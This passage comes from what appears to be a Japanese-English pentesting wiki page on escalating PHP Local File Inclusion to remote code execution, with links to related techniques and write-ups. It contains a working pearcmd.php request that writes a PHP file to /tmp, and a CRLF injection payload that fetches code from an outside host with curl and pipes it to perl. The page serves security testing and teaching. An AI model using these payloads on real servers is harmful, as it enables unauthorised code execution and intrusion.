もし **Local File Inclusion** を見つけ、サーバが **Windows** 上で動作している場合、RCE を得られる可能性があります：


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### `pearcmd.php` + URL args 経由

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp)、スクリプト `/usr/local/lib/phppearcmd.php` は php docker images にデフォルトで存在します。さらに、URL パラメータに `=` が無い場合は引数として扱われると示されているため、URL 経由でスクリプトに引数を渡すことが可能です。詳しくは [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) と [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/) を参照してください。

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
以下はCRLF vulnを悪用してRCEを取得する手法です（出典: [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo() 経由 (file_uploads = on)

もし **Local File Inclusion** を発見し、**phpinfo()** を表示しているファイルで file_uploads = on になっている場合、RCE を得られます:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure 経由

もし **Local File Inclusion** を見つけ、テンポラリファイルのパスを **exfiltrate** できるが、**server** が含めるファイルに PHP マークがあるかを **checking** している場合は、この **Race Condition** でそのチェックを **bypass** できるかもしれません:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### eternal waiting + bruteforce を使って

もし LFI を悪用して一時ファイルを **upload** し、サーバー側で PHP 実行を **hang** させられるなら、何時間もかけてファイル名を **brute force** してテンポラリファイルを見つけることができます:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Fatal Error を引き起こす

もし `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` のいずれかを include すると（同じものを 2 回 include する必要があります）、そのエラーが発生します。

**どう役立つかはわかりませんが、役に立つかもしれません。**\
_たとえ PHP Fatal Error を引き起こしても、アップロードされた PHP の一時ファイルは削除されます。_

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
